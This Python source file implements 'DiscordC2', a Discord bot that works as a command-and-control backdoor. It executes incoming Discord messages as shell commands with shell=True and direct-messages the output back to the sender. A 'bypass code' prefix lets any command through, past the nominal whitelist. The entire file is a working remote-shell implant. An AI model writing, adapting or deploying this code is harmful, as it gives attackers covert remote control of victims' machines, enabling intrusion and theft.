import discord
import subprocess
from bot_token import *
from commands import *


class DiscordC2(discord.Client):

    async def on_message(self, message):
        if message.author.bot:
            return
        """
        Current if statement to allow for only authorized commands by the server.
        It should be possible to import this from an external file.
        """
        if message.content in AUTHORIZED_COMMANDS:
            cmd = '{0.content}'.format(message)
            result = self.cmd_process(cmd)
            await message.author.send(result)
        elif message.content.startswith(BYPASS_CODE):
            cmd = '{0.content}'.format(message).replace(BYPASS_CODE, '', 1)
            result = self.cmd_process(cmd)
            await message.author.send(result)
        else:
            await message.author.send('Not an authorized command.')

    def cmd_process(self, cmd):
        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, close_fds=True)
        result = p.stdout.read().decode("utf-8")
        return result


def main():
    client = DiscordC2()
    client.run(BOT_TOKEN)


if __name__ == '__main__':
    main()
